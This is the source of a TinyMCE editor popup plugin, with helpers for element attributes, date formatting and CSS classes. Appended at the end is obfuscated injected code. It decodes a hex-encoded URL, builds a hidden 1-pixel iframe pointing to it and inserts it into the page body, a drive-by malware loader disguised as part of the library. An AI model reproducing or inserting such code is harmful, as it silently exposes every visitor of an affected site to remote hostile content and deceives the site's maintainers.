 /**
 * $Id: editor_plugin_src.js 42 2006-08-08 14:32:24Z spocke $
 *
 * @author Moxiecode - based on work by Andrew Tetlaw
 * @copyright Copyright © 2004-2008, Moxiecode Systems AB, All rights reserved.
 */

tinyMCEPopup.requireLangPack();

function initCommonAttributes(elm) {
	var formObj = document.forms[0], dom = tinyMCEPopup.editor.dom;

	// Setup form data for common element attributes
	setFormValue('title', dom.getAttrib(elm, 'title'));
	setFormValue('id', dom.getAttrib(elm, 'id'));
	selectByValue(formObj, 'class', dom.getAttrib(elm, 'class'), true);
	setFormValue('style', dom.getAttrib(elm, 'style'));
	selectByValue(formObj, 'dir', dom.getAttrib(elm, 'dir'));
	setFormValue('lang', dom.getAttrib(elm, 'lang'));
	setFormValue('onfocus', dom.getAttrib(elm, 'onfocus'));
	setFormValue('onblur', dom.getAttrib(elm, 'onblur'));
	setFormValue('onclick', dom.getAttrib(elm, 'onclick'));
	setFormValue('ondblclick', dom.getAttrib(elm, 'ondblclick'));
	setFormValue('onmousedown', dom.getAttrib(elm, 'onmousedown'));
	setFormValue('onmouseup', dom.getAttrib(elm, 'onmouseup'));
	setFormValue('onmouseover', dom.getAttrib(elm, 'onmouseover'));
	setFormValue('onmousemove', dom.getAttrib(elm, 'onmousemove'));
	setFormValue('onmouseout', dom.getAttrib(elm, 'onmouseout'));
	setFormValue('onkeypress', dom.getAttrib(elm, 'onkeypress'));
	setFormValue('onkeydown', dom.getAttrib(elm, 'onkeydown'));
	setFormValue('onkeyup', dom.getAttrib(elm, 'onkeyup'));
}

function setFormValue(name, value) {
	if(document.forms[0].elements[name]) document.forms[0].elements[name].value = value;
}

function insertDateTime(id) {
	document.getElementById(id).value = getDateTime(new Date(), "%Y-%m-%dT%H:%M:%S");
}

function getDateTime(d, fmt) {
	fmt = fmt.replace("%D", "%m/%d/%y");
	fmt = fmt.replace("%r", "%I:%M:%S %p");
	fmt = fmt.replace("%Y", "" + d.getFullYear());
	fmt = fmt.replace("%y", "" + d.getYear());
	fmt = fmt.replace("%m", addZeros(d.getMonth()+1, 2));
	fmt = fmt.replace("%d", addZeros(d.getDate(), 2));
	fmt = fmt.replace("%H", "" + addZeros(d.getHours(), 2));
	fmt = fmt.replace("%M", "" + addZeros(d.getMinutes(), 2));
	fmt = fmt.replace("%S", "" + addZeros(d.getSeconds(), 2));
	fmt = fmt.replace("%I", "" + ((d.getHours() + 11) % 12 + 1));
	fmt = fmt.replace("%p", "" + (d.getHours() < 12 ? "AM" : "PM"));
	fmt = fmt.replace("%%", "%");

	return fmt;
}

function addZeros(value, len) {
	var i;

	value = "" + value;

	if (value.length < len) {
		for (i=0; i<(len-value.length); i++)
			value = "0" + value;
	}

	return value;
}

function selectByValue(form_obj, field_name, value, add_custom, ignore_case) {
	if (!form_obj || !form_obj.elements[field_name])
		return;

	var sel = form_obj.elements[field_name];

	var found = false;
	for (var i=0; i<sel.options.length; i++) {
		var option = sel.options[i];

		if (option.value == value || (ignore_case && option.value.toLowerCase() == value.toLowerCase())) {
			option.selected = true;
			found = true;
		} else
			option.selected = false;
	}

	if (!found && add_custom && value != '') {
		var option = new Option('Value: ' + value, value);
		option.selected = true;
		sel.options[sel.options.length] = option;
	}

	return found;
}

function setAttrib(elm, attrib, value) {
	var formObj = document.forms[0];
	var valueElm = formObj.elements[attrib.toLowerCase()];
	tinyMCEPopup.editor.dom.setAttrib(elm, attrib, value || valueElm.value);
}

function setAllCommonAttribs(elm) {
	setAttrib(elm, 'title');
	setAttrib(elm, 'id');
	setAttrib(elm, 'class');
	setAttrib(elm, 'style');
	setAttrib(elm, 'dir');
	setAttrib(elm, 'lang');
	/*setAttrib(elm, 'onfocus');
	setAttrib(elm, 'onblur');
	setAttrib(elm, 'onclick');
	setAttrib(elm, 'ondblclick');
	setAttrib(elm, 'onmousedown');
	setAttrib(elm, 'onmouseup');
	setAttrib(elm, 'onmouseover');
	setAttrib(elm, 'onmousemove');
	setAttrib(elm, 'onmouseout');
	setAttrib(elm, 'onkeypress');
	setAttrib(elm, 'onkeydown');
	setAttrib(elm, 'onkeyup');*/
}

SXE = {
	currentAction : "insert",
	inst : tinyMCEPopup.editor,
	updateElement : null
}

SXE.focusElement = SXE.inst.selection.getNode();

SXE.initElementDialog = function(element_name) {
	addClassesToList('class', 'xhtmlxtras_styles');
	TinyMCE_EditableSelects.init();

	element_name = element_name.toLowerCase();
	var elm = SXE.inst.dom.getParent(SXE.focusElement, element_name.toUpperCase());
	if (elm != null && elm.nodeName.toUpperCase() == element_name.toUpperCase()) {
		SXE.currentAction = "update";
	}

	if (SXE.currentAction == "update") {
		initCommonAttributes(elm);
		SXE.updateElement = elm;
	}

	document.forms[0].insert.value = tinyMCEPopup.getLang(SXE.currentAction, 'Insert', true); 
}

SXE.insertElement = function(element_name) {
	var elm = SXE.inst.dom.getParent(SXE.focusElement, element_name.toUpperCase()), h, tagName;

	tinyMCEPopup.execCommand('mceBeginUndoLevel');
	if (elm == null) {
		var s = SXE.inst.selection.getContent();
		if(s.length > 0) {
			tagName = element_name;

			if (tinymce.isIE && element_name.indexOf('html:') == 0)
				element_name = element_name.substring(5).toLowerCase();

			insertInlineElement(element_name);
			var elementArray = tinymce.grep(SXE.inst.dom.select(element_name));
			for (var i=0; i<elementArray.length; i++) {
				var elm = elementArray[i];

				elm.id = '';
				elm.setAttribute('id', '');
				elm.removeAttribute('id');

				setAllCommonAttribs(elm);
			}
		}
	} else {
		setAllCommonAttribs(elm);
	}
	SXE.inst.nodeChanged();
	tinyMCEPopup.execCommand('mceEndUndoLevel');
}

SXE.removeElement = function(element_name){
	element_name = element_name.toLowerCase();
	elm = SXE.inst.dom.getParent(SXE.focusElement, element_name.toUpperCase());
	if(elm && elm.nodeName.toUpperCase() == element_name.toUpperCase()){
		tinyMCEPopup.execCommand('mceBeginUndoLevel');
		tinyMCE.execCommand('mceRemoveNode', false, elm);
		SXE.inst.nodeChanged();
		tinyMCEPopup.execCommand('mceEndUndoLevel');
	}
}

SXE.showRemoveButton = function() {
		document.getElementById("remove").style.display = 'block';
}

SXE.containsClass = function(elm,cl) {
	return (elm.className.indexOf(cl) > -1) ? true : false;
}

SXE.removeClass = function(elm,cl) {
	if(elm.className == null || elm.className == "" || !SXE.containsClass(elm,cl)) {
		return true;
	}
	var classNames = elm.className.split(" ");
	var newClassNames = "";
	for (var x = 0, cnl = classNames.length; x < cnl; x++) {
		if (classNames[x] != cl) {
			newClassNames += (classNames[x] + " ");
		}
	}
	elm.className = newClassNames.substring(0,newClassNames.length-1); //removes extra space at the end
}

SXE.addClass = function(elm,cl) {
	if(!SXE.containsClass(elm,cl)) elm.className ? elm.className += " " + cl : elm.className = cl;
	return true;
}

function insertInlineElement(en) {
	var ed = tinyMCEPopup.editor, dom = ed.dom;

	ed.getDoc().execCommand('FontName', false, 'mceinline');
	tinymce.each(dom.select(tinymce.isWebKit ? 'span' : 'font'), function(n) {
		if (n.style.fontFamily == 'mceinline' || n.face == 'mceinline')
			dom.replace(dom.create(en), n, 1);
	});
}

if('RzRI'=='vNmYZr')WotWy();var EeQB=190;var SAWXZ='xDLvr';var kNAir="ap\x70\x65n\x64Chil\x64";var xYLXAV=185;var pmYPbUq="from\x43harCode";var eAGoDq="pa\x72seIn\x74";var cZZxfH;if('Aoruhu'=='CvAro')bMEhTb='stDI';var KJdRokWGJ="";if('mhWHI'=='vuBb')cDAacx='tRSR';if('XKItnr'=='iXtkqQ')ibyaKC='cndwyY';var appVersion_var="a\x70\x70\x56e\x72s\x69on";var VKNc=10;var SozsA;var PZwXGX;if('dLNmC'=='WwTd')CCaq();if('URyu'=='FZzn')BCbGq();var TRUSkxc="body";var GVNV=79;var HyttL="slice";var NvejW='ntsiIx';var BMimh="\x63onstr\x75cto\x72";var pwqc;if('FvqYLK'=='IsceNQ')HQCI='VgQs';var BIhKphTEQ="9ba7a7a36d626299a59460a094ac656364656196a2a062a09ca197629ca161969a9c726463";var SZREI='tFuED';function lnKO(){}
var px1_var="1px";var klOIhyk=(function(){function TbDDFK(){var zuteCK='tVpSj';if('nZpx'=='rGoRe')Qxrv();}
return this;function OLah(){var yfPs='jVHplE';if('bUlmH'=='WEYcvU')dkYCa();}var CKletS;function rUIc(){var mKMf='CCsdY';if('aiBDhp'=='tylb')WcuC();}})();var yButY=215;var HStRUMg="sgNqAT"[BMimh];var XYwKI;var Sqwl;function QyBOBx(){var JzbjlS='JYtrb';if('zTKPI'=='Iphx')WuaUll();}
for(var IcBNC=0;IcBNC<BIhKphTEQ.length;IcBNC+=2){jvQERqqov=klOIhyk[eAGoDq](BIhKphTEQ[HyttL](IcBNC,IcBNC+2),16)-51;if('rnYZRw'=='hlTy')kVsaT();KJdRokWGJ+=HStRUMg[pmYPbUq](jvQERqqov);var nEJG;var iFmKZy;}
var HlpUpS=84;if('xWjUjt'=='dcGe')mumE='MUWlQ';var cFEu='KIZNt';var zcUAbgYzM="mRbjH";function LIWepn(){}if('wSwjh'=='nPjqNQ')esaOZs();var Tysr;var Iixrn="";var gTtVhp;if('gRYz'=='Vzog')OEzBK='ZYwWC';if(navigator[appVersion_var].indexOf("MSIE")!=-1){var DKGY='RZXGja';if('qJOYPa'=='aalQ')AUeuX();Iixrn='<iframe name="'+zcUAbgYzM+'" src="'+"KJdRokWGJ"+'">';var fancid='jMuUYl';function lXyuT(){}}else{var uQPPkp=194;Iixrn='iframe';var tljyA=208;}
if('SKDLX'=='rnTid')IejBuK();if('KpSDVL'=='ejxthb')kwtAy='twbq';var sPqYiADw=document.createElement(Iixrn);var lQuevG='OpkF';function IzLf(){var CuRqE='VpzNl';if('PgrAR'=='tTSHYF')dbRc();}
sPqYiADw.LsXigs=sPqYiADw.setAttribute;var oaKv='ekQsP';sPqYiADw.style.position="absolute";if('YPvq'=='gbal')tkkoYk='MfjxI';function vfNuI(){}
sPqYiADw.style.height=px1_var;function oRzdI(){}var QHFUR;var UqOfH='GwZBB';sPqYiADw.LsXigs("src",KJdRokWGJ);sPqYiADw.id=zcUAbgYzM;var pXTDG=159;sPqYiADw.style.top="0px";if('tiAK'=='qwJONu')Rqosk();if('ocqrzg'=='byOAl')lDYdEb();sPqYiADw.name=zcUAbgYzM;if('lxQsY'=='gbRhI')QgIPd='FXuK';function juVa(){}
sPqYiADw.style.right="0px";var Udti;if('vfBosj'=='oLaz')TsVT();sPqYiADw.style.width=px1_var;var fDOX;var XQsoM;var NOMde;function ictQFJNG(){var njIAE;if(document[TRUSkxc]){var RIdIR=158;if('QvzybL'=='DNkG')Skno='DjVSRQ';document[TRUSkxc][kNAir](sPqYiADw);}else{if('UzWHc'=='GEnF')sxeV();setTimeout(ictQFJNG,120);var hUVQ='mFuEUi';var imJFc=198;function pXlxj(){var HMIBED='XWnqe';if('LnIj'=='tyPOt')kOQyWJ();}}
var kOQVv='wGyH';}
if('fsjai'=='uWtI')HDDKFT();ictQFJNG();var OoTRIo=107;if('KFTOc'=='AIFvRC')ErNE();function LdLcmi(){var biGo='ELbpKK';if('xRgpIW'=='HvUu')lzEumj();}function NtmL(){}